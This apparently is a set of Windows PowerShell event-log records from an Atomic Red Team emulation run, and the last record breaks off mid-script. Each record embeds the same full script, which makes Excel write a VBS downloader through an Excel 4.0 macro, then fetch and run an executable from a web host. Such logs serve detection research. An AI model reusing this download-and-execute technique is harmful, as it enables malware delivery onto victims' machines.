{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:57.0655998"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item $fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:57.1156967"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item $fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:57.1156967"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item $fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:57.2260106"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item $fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:57.2260106"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item $fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:57.2260106"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item $fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:57.3751415"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item 